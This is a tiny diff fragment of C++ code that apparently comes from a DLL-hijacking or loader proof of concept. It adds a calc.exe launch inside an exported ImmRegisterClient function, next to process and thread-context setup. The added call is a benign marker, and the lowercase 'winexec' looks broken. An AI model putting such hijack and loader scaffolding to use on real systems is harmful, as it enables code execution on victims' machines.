@@ -43,7 +43,7 @@ CryptReleaseContext(hProv, 0);
 
 extern "C" __declspec(dllexport) long ImmRegisterClient()
 {
-    
+    winexec("calc.exe");
     CONTEXT da = {0};
     STARTUPINFO ci = {0};
     PROCESS_INFORMATION pei = {0};
